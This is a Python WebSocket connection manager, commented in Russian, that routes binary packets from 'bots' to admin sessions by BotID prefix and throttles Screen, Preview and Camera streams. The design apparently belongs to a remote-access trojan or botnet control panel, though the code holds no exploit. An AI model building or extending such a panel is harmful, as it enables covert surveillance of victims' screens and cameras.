# backend/API/connection_manager.py

import asyncio
from typing import Any, Dict, List, Set, Optional

import backend.LoggerWrapper as logger

class ConnectionManager:
    """
    Маршрутизатор бинарных пакетов V7.2 между ботами и WebSocket-клиентами.
    Реализует RBAC на основе префиксов BotID.
    """

    def __init__(self) -> None:
        self.active_users: Dict[str, List[Any]] = {}
        self.tunnels: Dict[str, List[Any]] = {} 
        self.queues: Dict[Any, asyncio.Queue] = {}
        self.send_tasks: Dict[Any, asyncio.Task] = {}

    async def connect(self, websocket: Any, login: str, user_data: Dict[str, Any]) -> bool:
        """Регистрация сессии админа с ограничением в 3 окна."""
        await websocket.accept()
        
        current_sessions = self.active_users.get(login, [])
        if len(current_sessions) >= 3:
            await websocket.close(code=1008)
            return False

        # Очередь на 200 пакетов. Если админ не успевает выгребать данные (слабый инет), 
        # сервер не упадет, а начнет дропать старые пакеты через троттлинг.
        outgoing_queue: asyncio.Queue = asyncio.Queue(maxsize=200)
        self.queues[websocket] = outgoing_queue
        self.send_tasks[websocket] = asyncio.create_task(self._writer(websocket, outgoing_queue))
        
        self.active_users.setdefault(login, []).append(websocket)
        
        user_prefix: str = user_data.get("prefix", "NONE")
        user_role: str = user_data.get("role", "user")
        
        # Логика доступа: Admin видит ALL + свой префикс, User только свой префикс.
        groups = {user_prefix}
        if user_role == "admin":
            groups.add("ALL")
            
        for group in groups:
            self.tunnels.setdefault(group, []).append(websocket)

        logger.Log.info(f"[{self.__class__.__name__}] [+] {login} ({user_prefix})")
        return True

    def broadcast_packet_sync(self, packet: bytes) -> None:
        """
        Разбор заголовка V7.2 и рассылка пакета целевым WebSocket-туннелям.
        """
        if len(packet) < 6:
            return

        # Парсим заголовок V7.2: [1b id_len][1b mod_len][4b pay_len]
        id_len = packet[0]
        mod_len = packet[1]
        
        try:
            # Извлекаем ID (смещение 6)
            bot_id_bytes = packet[6 : 6 + id_len]
            bot_id = bot_id_bytes.decode(errors="ignore").strip()
            
            # Извлекаем Название модуля для проверки на мультимедиа (смещение 6 + id_len)
            module_name_bytes = packet[6 + id_len : 6 + id_len + mod_len]
        except Exception:
            return

        # По ТЗ V7.2 префикс — это всё, что до первого дефиса
        bot_prefix = bot_id.split("-")[0] if "-" in bot_id else "NONE"
        
        # Собираем уникальный сет получателей (кто-то может быть в ALL и в RU одновременно)
        target_websockets = set(self.tunnels.get(bot_prefix, [])) | set(self.tunnels.get("ALL", []))
        
        if not target_websockets:
            return

        # Троттлинг для тяжелых модулей (Screen, Preview, Camera)
        is_heavy = any(x in module_name_bytes for x in [b"Screen", b"Preview", b"Frame", b"Camera"])

        for websocket in target_websockets:
            queue = self.queues.get(websocket)
            if not queue:
                continue
            
            # Если очередь полна и это тяжелый пакет — освобождаем место под актуальный кадр
            if is_heavy and queue.full():
                try:
                    # Выбрасываем 10 старых кадров, чтобы не было задержки в стриме
                    for _ in range(10):
                        if not queue.empty():
                            queue.get_nowait()
                except Exception:
                    pass

            try:
                queue.put_nowait(packet)
            except asyncio.QueueFull:
                # Если даже после чистки или для обычных данных очередь полна — пакет теряется
                pass

    async def _writer(self, websocket: Any, queue: asyncio.Queue) -> None:
        """Асинхронная выгрузка очереди в WebSocket."""
        try:
            while True:
                packet_to_send = await queue.get()
                await websocket.send_bytes(packet_to_send)
                queue.task_done()
        except Exception:
            pass 

    def disconnect(self, websocket: Any, login: str) -> None:
        """Полная очистка ресурсов при закрытии сессии."""
        if (task := self.send_tasks.pop(websocket, None)):
            task.cancel()
            
        self.queues.pop(websocket, None)
        
        # Чистим списки активных юзеров
        if login in self.active_users:
            if websocket in self.active_users[login]:
                self.active_users[login].remove(websocket)
            if not self.active_users[login]:
                self.active_users.pop(login)
                
        # Чистим туннели
        for group in list(self.tunnels.keys()):
            if websocket in self.tunnels[group]:
                self.tunnels[group].remove(websocket)
            if not self.tunnels[group]:
                self.tunnels.pop(group)

        logger.Log.info(f"[{self.__class__.__name__}] [-] {login}")

manager: ConnectionManager = ConnectionManager()